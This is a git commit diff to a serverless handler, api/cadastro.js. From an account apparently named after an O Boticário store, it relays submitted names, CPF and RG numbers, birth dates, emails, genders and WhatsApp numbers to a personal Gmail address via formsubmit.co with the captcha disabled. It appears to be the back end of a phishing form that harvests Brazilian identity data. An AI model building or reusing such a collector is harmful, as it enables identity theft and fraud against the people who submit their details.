ad89c7f919b68de531e6b726d3547057722157ed
lojaboticario00-sudo <lojaboticario00@gmail.com>
2026-05-06 22:36:06 -0300

    Update cadastro.js

--- api/cadastro.js
+++ api/cadastro.js
@@ -4,41 +4,48 @@ export default async function handler(req, res) {
     return res.status(405).send("Método não permitido");
   }
 
-  const { nome, cpf, rg, nasc, email, genero, whats } = req.body;
-
-  const mensagem = `
-Novo cadastro recebido:
-
-Nome: ${nome}
-CPF: ${cpf}
-RG: ${rg}
-Nascimento: ${nasc}
-E-mail: ${email}
-Gênero: ${genero}
-WhatsApp: ${whats}
-`;
-
   try {
 
-    const response = await fetch("https://formsubmit.co/ajax/lojaboticario00@gmail.com", {
+    const { nome, cpf, rg, nasc, email, genero, whats } = req.body;
+
+    const response = await fetch("https://formsubmit.co/ajax/SEUEMAIL@gmail.com", {
       method: "POST",
       headers: {
-        "Content-Type": "application/json"
+        "Content-Type": "application/json",
+        "Accept": "application/json"
       },
+
       body: JSON.stringify({
-        subject: "Novo Cadastro",
-        message: mensagem
+
+        nome: nome,
+        cpf: cpf,
+        rg: rg,
+        nascimento: nasc,
+        email: email,
+        genero: genero,
+        whatsapp: whats,
+
+        _subject: "Novo Cadastro",
+        _captcha: false
+
       })
+
     });
 
-    if (!response.ok) {
-      throw new Error("Erro ao enviar email");
+    const data = await response.json();
+
+    if (data.success === "true" || response.ok) {
+      return res.status(200).send("Cadastro enviado");
     }
 
-    return res.status(200).send("Cadastro enviado");
+    return res.status(500).send("Erro ao enviar email");
 
   } catch (error) {
+
+    console.error(error);
+
     return res.status(500).send("Erro interno");
+
   }
 
 }
